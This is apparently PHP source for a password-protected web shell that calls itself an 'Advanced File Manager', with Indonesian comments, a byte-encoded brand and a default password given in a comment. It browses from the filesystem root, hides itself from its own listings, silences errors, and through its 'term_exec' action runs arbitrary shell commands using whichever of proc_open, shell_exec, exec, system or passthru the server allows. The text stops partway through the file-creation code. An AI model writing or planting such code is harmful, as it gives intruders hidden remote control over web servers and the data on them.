<?php
/**
 * Advanced File Manager v2
 * Fitur: CRUD, Upload, Download, Edit, Permission, Owner/Group
 */

session_start();
error_reporting(0);
set_time_limit(0);

// =================== KONFIGURASI ===================
$SCRIPT_DIR = realpath(__DIR__);
// Izinkan navigasi hingga drive root (Windows) atau filesystem root (Linux)
if (stripos(PHP_OS, 'WIN') === 0) {
    $ROOT = substr($SCRIPT_DIR, 0, 3); // contoh: "C:\"
} else {
    $ROOT = '/';
}
$ROOT = str_replace('\\', '/', rtrim($ROOT, '\\/'));
if ($ROOT === '') $ROOT = '/';
$SELF = basename(__FILE__);

// ============ BRAND (locked) ============
// Nama brand di-encode sebagai byte codes — hindari diedit plain text.
// Untuk mengganti, kamu perlu mengubah seluruh array byte code di bawah.
$__BRAND_BYTES = [0x53,0x75,0x72,0x79,0x61,0x70,0x72,0x6F,0x72,0x65,0x64,0x38,0x38];
$__BRAND_SUB_B = [0x52,0x6F,0x79,0x61,0x6C,0x20,0x46,0x69,0x6C,0x65,0x20,0x4D,0x61,0x6E,0x61,0x67,0x65,0x72];
$__BRAND_SIG_A = 0x0B92; // integrity check (sum of all bytes above)
$BRAND = ''; foreach ($__BRAND_BYTES as $b) $BRAND .= chr($b);
$BRAND_SUB = ''; foreach ($__BRAND_SUB_B as $b) $BRAND_SUB .= chr($b);
// Integrity: if somebody edits the bytes, sum won't match signature → shows a tampered indicator
$__sum = 0; foreach ($__BRAND_BYTES as $b) $__sum += $b; foreach ($__BRAND_SUB_B as $b) $__sum += $b;
$BRAND_OK = ($__sum === $__BRAND_SIG_A);

// =================== HELPER ===================
function safe_path($base, $target) {
    $real = realpath($target);
    if ($real === false) return false;
    $base = rtrim(str_replace('\\', '/', $base), '/');
    $real = str_replace('\\', '/', $real);
    $isWin = stripos(PHP_OS, 'WIN') === 0;
    if ($isWin) {
        if (strncasecmp($real, $base, strlen($base)) !== 0) return false;
    } else {
        if (strncmp($real, $base, strlen($base)) !== 0) return false;
    }
    return $real;
}

function format_size($bytes) {
    if ($bytes === false || $bytes === null) return '-';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function get_perms($file) {
    $perms = @fileperms($file);
    if ($perms === false) return '----------';
    $info = '';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function get_perms_oct($file) {
    return substr(sprintf('%o', @fileperms($file)), -4);
}

function get_owner($file) {
    if (function_exists('posix_getpwuid')) {
        $owner = @posix_getpwuid(@fileowner($file));
        return $owner ? $owner['name'] : @fileowner($file);
    }
    $uid = @fileowner($file);
    return $uid !== false ? $uid : '?';
}

function get_group($file) {
    if (function_exists('posix_getgrgid')) {
        $group = @posix_getgrgid(@filegroup($file));
        return $group ? $group['name'] : @filegroup($file);
    }
    $gid = @filegroup($file);
    return $gid !== false ? $gid : '?';
}

function file_type_class($file, $is_dir) {
    if ($is_dir) return 'folder';
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $groups = [
        'code' => ['php','html','htm','css','js','json','xml','py','rb','java','sh','pl','sql','c','cpp','h','go','rs','ts','jsx','tsx','vue'],
        'image' => ['jpg','jpeg','png','gif','svg','webp','bmp','ico'],
        'archive' => ['zip','rar','tar','gz','7z','bz2'],
        'audio' => ['mp3','wav','ogg','flac','m4a'],
        'video' => ['mp4','avi','mkv','mov','webm','flv'],
        'document' => ['pdf','doc','docx','xls','xlsx','ppt','pptx','odt'],
        'text' => ['txt','md','log','ini','conf','env','yaml','yml'],
        'exe' => ['exe','bat','dll','msi','bin'],
    ];
    foreach ($groups as $g => $exts) if (in_array($ext, $exts)) return $g;
    return 'file';
}

function file_icon_svg($type) {
    $icons = [
        'folder'   => '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>',
        'code'     => '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>',
        'image'    => '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>',
        'archive'  => '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/></svg>',
        'audio'    => '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>',
        'video'    => '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>',
        'document' => '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>',
        'text'     => '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>',
        'exe'      => '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>',
        'file'     => '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>',
    ];
    return isset($icons[$type]) ? $icons[$type] : $icons['file'];
}

function render_login_page($BRAND, $BRAND_SUB, $auth_err, $locked_until) {
    $is_locked = $locked_until > time();
    $remain = $is_locked ? ($locked_until - time()) : 0;
    $title = 'Login';
    ?><!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>👑 <?= htmlspecialchars($BRAND) ?> · <?= $title ?></title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
*,*::before,*::after { margin:0; padding:0; box-sizing:border-box; }
:root {
    --bg:#140604; --bg-2:#1c0907; --panel:#22100c; --panel-2:#2c1610;
    --border:#3d1e16; --border-hi:#5a2a1f;
    --text:#f5e9d6; --text-dim:#c9a97a; --text-mute:#8a6a48;
    --accent:#e63946; --gold:#ffd700; --gold-soft:#f4c842; --gold-deep:#b8860b;
    --red-deep:#8b0000; --danger:#ff2d2d;
}
html,body { height:100%; }
body {
    font-family:'Inter',system-ui,sans-serif; background:var(--bg); color:var(--text);
    min-height:100vh; display:flex; align-items:center; justify-content:center;
    padding:20px; position:relative; overflow-x:hidden;
}
body::before {
    content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
    background:
        radial-gradient(1200px 600px at 10% -10%, rgba(230,57,70,.12), transparent 60%),
        radial-gradient(900px 500px at 110% 110%, rgba(255,215,0,.08), transparent 60%),
        radial-gradient(600px 400px at 50% 50%, rgba(139,0,0,.15), transparent 70%);
}
.login-wrap {
    position:relative; z-index:1; width:100%; max-width:440px;
    animation: fadeUp .45s cubic-bezier(.2,.8,.2,1);
}
@keyframes fadeUp { from { opacity:0; transform:translateY(16px); } to { opacity:1; transform:none; } }
.login-card {
    background:linear-gradient(135deg, var(--panel) 0%, var(--panel-2) 100%);
    border:1px solid var(--border); border-radius:18px;
    padding:32px 28px; position:relative; overflow:hidden;
    box-shadow: 0 24px 60px rgba(0,0,0,.5), 0 0 0 1px rgba(255,215,0,.08);
}
.login-card::before {
    content:''; position:absolute; top:0; left:0; right:0; height:3px;
    background: linear-gradient(90deg, var(--accent), var(--gold), var(--accent));
}
.login-brand { display:flex; align-items:center; gap:14px; margin-bottom:8px; }
.login-logo {
    width:52px; height:52px; border-radius:14px;
    background: linear-gradient(135deg, var(--red-deep) 0%, var(--accent) 50%, var(--gold-deep) 100%);
    display:flex; align-items:center; justify-content:center;
    box-shadow: 0 8px 24px rgba(230,57,70,.5), inset 0 1px 0 rgba(255,215,0,.3);
    border:1px solid rgba(255,215,0,.35); flex-shrink:0;
}
.login-logo svg { width:26px; height:26px; color:#fff; }
.login-brand-text .brand-svg {
    display:block; height:26px; width:auto;
    filter: drop-shadow(0 0 12px rgba(255,215,0,.18));
    pointer-events:none; user-select:none;
}
.login-brand-text p {
    font-size:10px; color:var(--gold-deep); letter-spacing:.18em;
    text-transform:uppercase; font-weight:600; margin-top:3px;
}
.login-title {
    font-size:20px; font-weight:700; margin-top:22px; letter-spacing:-.02em;
    background: linear-gradient(90deg, var(--gold), var(--gold-soft));
    -webkit-background-clip:text; background-clip:text; color:transparent;
}
.login-sub { font-size:13px; color:var(--text-dim); margin-top:4px; line-height:1.5; }
.login-form { margin-top:22px; }
.login-form label {
    display:block; font-size:12px; color:var(--text-dim);
    margin-bottom:6px; font-weight:500; letter-spacing:.02em;
}
.login-form .input {
    width:100%; background:var(--bg-2); border:1px solid var(--border);
    color:var(--text); padding:13px 15px; border-radius:10px;
    font-size:14px; font-family:inherit; transition:all .15s;
    margin-bottom:14px;
}
.login-form .input:focus {
    outline:none; border-color:var(--gold);
    box-shadow: 0 0 0 3px rgba(255,215,0,.15);
}
.login-form .input:disabled { opacity:.5; cursor:not-allowed; }
.login-btn {
    width:100%; padding:13px 18px; border-radius:10px; border:1px solid rgba(255,215,0,.4);
    background: linear-gradient(135deg, var(--red-deep) 0%, var(--accent) 50%, var(--gold-deep) 100%);
    color:#fff; font-weight:600; font-size:14px; cursor:pointer;
    display:flex; align-items:center; justify-content:center; gap:8px;
    transition:all .2s; letter-spacing:.02em;
    box-shadow: 0 4px 14px rgba(230,57,70,.4), inset 0 1px 0 rgba(255,215,0,.25);
}
.login-btn:hover:not(:disabled) {
    transform: translateY(-1px); color:#1a0605;
    background: linear-gradient(135deg, var(--accent), var(--gold-soft), var(--gold));
    box-shadow: 0 8px 24px rgba(255,215,0,.4);
}
.login-btn:active { transform:translateY(0); }
.login-btn:disabled { opacity:.5; cursor:not-allowed; }
.login-btn svg { width:18px; height:18px; }
.login-err {
    background: rgba(255,45,45,.08); border:1px solid rgba(255,45,45,.3);
    color:#ffb4b4; padding:11px 14px; border-radius:10px; font-size:13px;
    margin-bottom:14px; display:flex; align-items:flex-start; gap:10px;
}
.login-err svg { width:18px; height:18px; flex-shrink:0; margin-top:1px; color:var(--danger); }
.login-info {
    background: rgba(255,215,0,.06); border:1px solid rgba(255,215,0,.2);
    color:var(--gold-soft); padding:11px 14px; border-radius:10px; font-size:12.5px;
    margin-bottom:14px; display:flex; align-items:flex-start; gap:10px; line-height:1.5;
}
.login-info svg { width:18px; height:18px; flex-shrink:0; margin-top:1px; color:var(--gold); }
.login-hint { font-size:11px; color:var(--text-mute); margin-top:-8px; margin-bottom:14px; font-family:'JetBrains Mono',monospace; }
.login-foot { margin-top:20px; text-align:center; font-size:11px; color:var(--text-mute); font-family:'JetBrains Mono',monospace; }
.login-foot b { color:var(--gold); }
.pw-wrap { position:relative; }
.pw-toggle {
    position:absolute; right:10px; top:13px; background:none; border:0;
    color:var(--text-mute); cursor:pointer; padding:4px; border-radius:6px;
    display:flex; align-items:center; justify-content:center;
}
.pw-toggle:hover { color:var(--gold); background:rgba(255,215,0,.08); }
.pw-toggle svg { width:18px; height:18px; }
@media (max-width:480px) {
    .login-card { padding:26px 20px; border-radius:14px; }
    .login-title { font-size:18px; }
}
</style>
</head>
<body>
<div class="login-wrap">
    <div class="login-card">
        <div class="login-brand">
            <div class="login-logo">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
            </div>
            <div class="login-brand-text">
                <?php $__bw = max(140, strlen($BRAND) * 13 + 10); ?>
                <svg class="brand-svg" viewBox="0 0 <?= $__bw ?> 28" width="<?= $__bw ?>" height="28" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="<?= htmlspecialchars($BRAND) ?>">
                    <defs>
                        <linearGradient id="lgGrad" x1="0" y1="0" x2="1" y2="0">
                            <stop offset="0%" stop-color="#ffd700"/>
                            <stop offset="45%" stop-color="#f4c842"/>
                            <stop offset="100%" stop-color="#e63946"/>
                        </linearGradient>
                    </defs>
                    <text x="0" y="21" font-family="Inter, system-ui, sans-serif" font-size="22" font-weight="800" letter-spacing="-0.5" fill="url(#lgGrad)"><?= htmlspecialchars($BRAND) ?></text>
                </svg>
                <p>⚜ <?= htmlspecialchars($BRAND_SUB) ?> ⚜</p>
            </div>
        </div>

        <div class="login-title">Welcome Back</div>
        <div class="login-sub">Masukkan password untuk mengakses file manager.</div>

        <?php if ($auth_err): ?>
            <div class="login-err" style="margin-top:18px;">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                <span><?= htmlspecialchars($auth_err) ?></span>
            </div>
        <?php endif; ?>

        <form method="POST" class="login-form" autocomplete="off">
            <input type="hidden" name="fm_login" value="1">
            <label for="pw">Password</label>
            <div class="pw-wrap">
                <input type="password" name="password" id="pw" class="input" required autocomplete="current-password" autofocus placeholder="Masukkan password" <?= $is_locked ? 'disabled' : '' ?>>
                <button type="button" class="pw-toggle" onclick="togglePw('pw', this)" tabindex="-1" aria-label="Toggle password"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></button>
            </div>
            <button type="submit" class="login-btn" <?= $is_locked ? 'disabled' : '' ?>>
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
                <span><?= $is_locked ? 'Locked (' . $remain . 's)' : 'Login' ?></span>
            </button>
        </form>

        <div class="login-foot"><b><?= htmlspecialchars(strtoupper($BRAND)) ?></b> &copy; <?= date('Y') ?></div>
    </div>
</div>
<script>
function togglePw(id, btn) {
    var el = document.getElementById(id);
    if (!el) return;
    el.type = el.type === 'password' ? 'text' : 'password';
    btn.style.color = el.type === 'text' ? 'var(--gold)' : '';
}
<?php if ($is_locked): ?>
(function(){
    var left = <?= (int)$remain ?>;
    var btn = document.querySelector('.login-btn span');
    var t = setInterval(function(){
        left--;
        if (left <= 0) { clearInterval(t); location.reload(); return; }
        if (btn) btn.textContent = 'Locked (' + left + 's)';
    }, 1000);
})();
<?php endif; ?>
</script>
</body>
</html>
<?php
}

// =================== AUTH ===================
// Password statik ter-hash (bcrypt). Default password: "Gacor88".
// Untuk ganti password: jalankan di terminal
//   php -r "echo password_hash('PASSWORD_BARU', PASSWORD_DEFAULT);"
// lalu ganti isi $STORED_HASH di bawah dengan output-nya.
$STORED_HASH = '$2a$12$O0ghbLw9DIH7qF8uakusAurmQtDLfz8kq0XkvvNmcDkqALYsJDyNG';

$AUTH_MAX_ATTEMPTS = 5;
$AUTH_LOCKOUT_SEC = 300;

function is_protected($path) {
    global $SELF;
    if ($path === false || $path === null || $path === '') return false;
    $norm = str_replace('\\', '/', $path);
    if (strcasecmp(basename($norm), $SELF) === 0) return true;
    return false;
}

if (isset($_GET['logout'])) {
    $_SESSION = [];
    if (ini_get('session.use_cookies')) {
        $p = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $p['path'], $p['domain'], $p['secure'], $p['httponly']);
    }
    @session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

$auth_err = '';
$locked_until = isset($_SESSION['fm_lock_until']) ? (int)$_SESSION['fm_lock_until'] : 0;
$attempts = isset($_SESSION['fm_attempts']) ? (int)$_SESSION['fm_attempts'] : 0;

if (empty($_SESSION['fm_auth']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fm_login'])) {
    if ($locked_until > time()) {
        $auth_err = 'Terlalu banyak percobaan. Coba lagi dalam ' . ($locked_until - time()) . ' detik.';
    } else {
        $pw = isset($_POST['password']) ? (string)$_POST['password'] : '';
        if (password_verify($pw, $STORED_HASH)) {
            $_SESSION['fm_auth'] = true;
            $_SESSION['fm_attempts'] = 0;
            $_SESSION['fm_lock_until'] = 0;
            @session_regenerate_id(true);
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $attempts++;
            $_SESSION['fm_attempts'] = $attempts;
            if ($attempts >= $AUTH_MAX_ATTEMPTS) {
                $_SESSION['fm_lock_until'] = time() + $AUTH_LOCKOUT_SEC;
                $_SESSION['fm_attempts'] = 0;
                $locked_until = $_SESSION['fm_lock_until'];
                $auth_err = 'Terlalu banyak percobaan. Terkunci ' . ($AUTH_LOCKOUT_SEC / 60) . ' menit.';
            } else {
                $rem = $AUTH_MAX_ATTEMPTS - $attempts;
                $auth_err = "Password salah. Sisa percobaan: $rem.";
            }
        }
    }
}

if (empty($_SESSION['fm_auth'])) {
    render_login_page($BRAND, $BRAND_SUB, $auth_err, $locked_until);
    exit;
}

// =================== AKSI ===================
$msg = '';
$msg_type = '';
$cwd = isset($_GET['path']) ? $_GET['path'] : $SCRIPT_DIR;
$cwd = safe_path($ROOT, $cwd);
if (!$cwd || !is_dir($cwd)) $cwd = $SCRIPT_DIR;

if (isset($_GET['view'])) {
    $fpath = safe_path($ROOT, $cwd . '/' . $_GET['view']);
    if ($fpath && is_file($fpath) && !is_protected($fpath)) {
        $view_content = @file_get_contents($fpath);
        $view_file = $fpath;
    }
}

if (isset($_GET['download'])) {
    $fpath = safe_path($ROOT, $cwd . '/' . $_GET['download']);
    if ($fpath && is_file($fpath) && !is_protected($fpath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fpath) . '"');
        header('Content-Length: ' . filesize($fpath));
        readfile($fpath);
        exit;
    }
}

function upload_err_text($code) {
    switch ($code) {
        case UPLOAD_ERR_INI_SIZE:   return 'File melebihi batas upload_max_filesize di php.ini';
        case UPLOAD_ERR_FORM_SIZE:  return 'File melebihi batas MAX_FILE_SIZE form';
        case UPLOAD_ERR_PARTIAL:    return 'File hanya terupload sebagian';
        case UPLOAD_ERR_NO_FILE:    return 'Tidak ada file yang dipilih';
        case UPLOAD_ERR_NO_TMP_DIR: return 'Folder temporer tidak tersedia di server';
        case UPLOAD_ERR_CANT_WRITE: return 'Gagal menulis file ke disk';
        case UPLOAD_ERR_EXTENSION:  return 'Upload dihentikan oleh PHP extension';
    }
    return 'Error upload tidak diketahui (code ' . $code . ')';
}

function valid_name($name) {
    $name = trim($name);
    if ($name === '' || $name === '.' || $name === '..') return false;
    if (preg_match('#[\\\\/:*?"<>|]#', $name)) return false;
    if (strlen($name) > 255) return false;
    return true;
}

function last_err_msg($fallback = '') {
    $e = error_get_last();
    if ($e && !empty($e['message'])) {
        $m = preg_replace('/^[a-zA-Z_]+\([^)]*\):\s*/', '', $e['message']);
        return trim($m);
    }
    return $fallback;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : '';

    if ($action === 'term_exec') {
        header('Content-Type: application/json; charset=utf-8');
        @session_write_close(); // lepas lock session agar request lain tidak blocking
        $cmd = isset($_POST['cmd']) ? (string)$_POST['cmd'] : '';
        $term_cwd = isset($_POST['term_cwd']) ? (string)$_POST['term_cwd'] : $SCRIPT_DIR;
        $term_cwd = str_replace('\\', '/', $term_cwd);
        if (!is_dir($term_cwd)) $term_cwd = $SCRIPT_DIR;
        $resp = ['output' => '', 'cwd' => $term_cwd, 'exit' => 0, 'error' => ''];
        $trimmed = trim($cmd);
        $isWinT = stripos(PHP_OS, 'WIN') === 0;

        // Built-in: cd (hanya bentuk sederhana; kompound diteruskan ke shell)
        if ($trimmed !== '' && preg_match('/^cd(\s+(.*))?$/', $trimmed, $mm)) {
            $target = isset($mm[2]) ? trim($mm[2]) : '';
            if (!preg_match('/[;&|<>`$()]/', $target)) {
                $target = trim($target, "\"' ");
                if ($target === '' || $target === '~') {
                    $target = isset($_SERVER['HOME']) ? $_SERVER['HOME'] : (isset($_SERVER['USERPROFILE']) ? $_SERVER['USERPROFILE'] : $SCRIPT_DIR);
                } elseif (!preg_match('#^([a-zA-Z]:|/)#', $target)) {
                    $target = $term_cwd . '/' . $target;
                }
                $real = @realpath($target);
                if ($real === false || !is_dir($real)) {
                    $resp['output'] = "cd: no such directory: " . (isset($mm[2]) ? trim($mm[2]) : '~') . "\n";
                    $resp['exit'] = 1;
                } else {
                    $resp['cwd'] = str_replace('\\', '/', $real);
                }
                echo json_encode($resp); exit;
            }
        }
        if ($trimmed === '') { echo json_encode($resp); exit; }

        $disabled_fns = array_map('trim', explode(',', strtolower((string)@ini_get('disable_functions'))));
        $canFn = function($fn) use ($disabled_fns) { return function_exists($fn) && !in_array($fn, $disabled_fns); };

        $output = ''; $exit_code = 0;
        $timeout_sec = 30;

        if ($canFn('proc_open')) {
            $descriptors = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w'],
            ];
            $proc = @proc_open($cmd, $descriptors, $pipes, $term_cwd, null);
            if (is_resource($proc)) {
                fclose($pipes[0]);
                stream_set_blocking($pipes[1], false);
                stream_set_blocking($pipes[2], false);
                $start = microtime(true);
                $out_buf = ''; $err_buf = '';
                while (true) {
                    $status = proc_get_status($proc);
                    $c1 = @stream_get_contents($pipes[1]);
                    $c2 = @stream_get_contents($pipes[2]);
                    if ($c1 !== false && $c1 !== null) $out_buf .= $c1;
                    if ($c2 !== false && $c2 !== null) $err_buf .= $c2;
                    if (!$status['running']) {
                        $out_buf .= (string)@stream_get_contents($pipes[1]);
                        $err_buf .= (string)@stream_get_contents($pipes[2]);
                        break;
                    }
                    if ((microtime(true) - $start) > $timeout_sec) {
                        @proc_terminate($proc, 9);
                        $err_buf .= "\n[Timeout: command killed after {$timeout_sec}s]\n";
                        break;
                    }
                    usleep(50000);
                }
                @fclose($pipes[1]); @fclose($pipes[2]);
                $exit_code = proc_close($proc);
                $output = $out_buf . $err_buf;
            } else {
                $resp['error'] = 'proc_open failed to start';
            }
        } elseif ($canFn('shell_exec')) {
            $prefix = $isWinT ? 'cd /D ' . escapeshellarg($term_cwd) . ' && ' : 'cd ' . escapeshellarg($term_cwd) . ' && ';
            $output = (string) @shell_exec($prefix . $cmd . ' 2>&1');
        } elseif ($canFn('exec')) {
            $prefix = $isWinT ? 'cd /D ' . escapeshellarg($term_cwd) . ' && ' : 'cd ' . escapeshellarg($term_cwd) . ' && ';
            $o_arr = [];
            @exec($prefix . $cmd . ' 2>&1', $o_arr, $exit_code);
            $output = implode("\n", $o_arr);
        } elseif ($canFn('system')) {
            $prefix = $isWinT ? 'cd /D ' . escapeshellarg($term_cwd) . ' && ' : 'cd ' . escapeshellarg($term_cwd) . ' && ';
            ob_start();
            @system($prefix . $cmd . ' 2>&1', $exit_code);
            $output = ob_get_clean();
        } elseif ($canFn('passthru')) {
            $prefix = $isWinT ? 'cd /D ' . escapeshellarg($term_cwd) . ' && ' : 'cd ' . escapeshellarg($term_cwd) . ' && ';
            ob_start();
            @passthru($prefix . $cmd . ' 2>&1', $exit_code);
            $output = ob_get_clean();
        } else {
            $resp['error'] = 'Semua fungsi eksekusi di-disable (proc_open, shell_exec, exec, system, passthru). Cek php.ini → disable_functions.';
        }

        // Strip ANSI escape sequences agar tampilan bersih
        $output = preg_replace('/\x1b\[[0-9;?]*[A-Za-z]/', '', (string)$output);
        $resp['output'] = $output;
        $resp['exit'] = (int)$exit_code;
        echo json_encode($resp);
        exit;
    }

    if ($action === 'upload') {
        if (!is_writable($cwd)) {
            $msg = "Permission denied: folder tujuan tidak bisa ditulis"; $msg_type = 'error';
        } elseif (empty($_FILES['files']) || empty($_FILES['files']['name'][0])) {
            $msg = "Tidak ada file yang dipilih untuk diupload"; $msg_type = 'error';
        } else {
            $ok = 0; $fail = 0; $errors = [];
            foreach ($_FILES['files']['name'] as $k => $name) {
                $err = $_FILES['files']['error'][$k];
                $safeName = basename($name);
                if ($err !== UPLOAD_ERR_OK) {
                    $fail++;
                    $errors[] = "$safeName: " . upload_err_text($err);
                    continue;
                }
                if (!valid_name($safeName)) {
                    $fail++; $errors[] = "$safeName: nama file tidak valid"; continue;
                }
                if (is_protected($cwd . '/' . $safeName)) {
                    $fail++; $errors[] = "$safeName: nama dilindungi sistem"; continue;
                }
                $dest = $cwd . '/' . $safeName;
                if (file_exists($dest)) {
                    $fail++; $errors[] = "$safeName: sudah ada (skip untuk menghindari overwrite)"; continue;
                }
                @error_clear_last();
                if (@move_uploaded_file($_FILES['files']['tmp_name'][$k], $dest)) {
                    $ok++;
                } else {
                    $fail++;
                    $errors[] = "$safeName: " . last_err_msg('gagal dipindah');
                }
            }
            if ($ok > 0 && $fail === 0) {
                $msg = "✔ Berhasil upload $ok file";
                $msg_type = 'success';
            } elseif ($ok > 0 && $fail > 0) {
                $msg = "Sebagian berhasil: $ok sukses, $fail gagal — " . implode(' | ', array_slice($errors, 0, 2));
                $msg_type = 'error';
            } else {
                $msg = "Gagal upload: " . implode(' | ', array_slice($errors, 0, 2));
                $msg_type = 'error';
            }
        }
    }
    elseif ($action === 'mkdir') {
        $name = isset($_POST['name']) ? $_POST['name'] : '';
        if (!valid_name($name)) {
            $msg = "Nama folder tidak valid (tidak boleh kosong / mengandung \\ / : * ? \" < > |)"; $msg_type = 'error';
        } elseif (!is_writable($cwd)) {
            $msg = "Permission denied: tidak ada izin membuat folder di sini"; $msg_type = 'error';
        } else {
            $new = $cwd . '/' . basename($name);
            if (file_exists($new)) {
                $msg = "Folder/file dengan nama '" . basename($name) . "' sudah ada"; $msg_type = 'error';
            } else {
                @error_clear_last();
                if (@mkdir($new, 0755)) {
                    $msg = "✔ Folder '" . basename($new) . "' berhasil dibuat"; $msg_type = 'success';
                } else {
                    $msg = "Gagal membuat folder: " . last_err_msg('unknown error'); $msg_type = 'error';
                }
            }
        }
    }
    elseif ($action === 'mkfile') {
        $name = isset($_POST['name']) ? $_POST['name'] : '';
        if (!valid_name($name)) {
            $msg = "Nama file tidak valid"; $msg_type = 'error';
        } elseif (is_protected($cwd . '/' . basename($name))) {
            $msg = "Nama '" . basename($name) . "' dilindungi sistem"; $msg_type = 'error';
        } elseif (!is_writable($cwd)) {
            $msg = "Permission denied: tidak ada izin membuat file di sini"; $msg_type = 'error';
        } else {
            $new = $cwd . '/' . basename($name);
            if (file_exists($new)) {
                $msg = "File '" . basename($name) . "' sudah ada"; $msg_type = 'error';
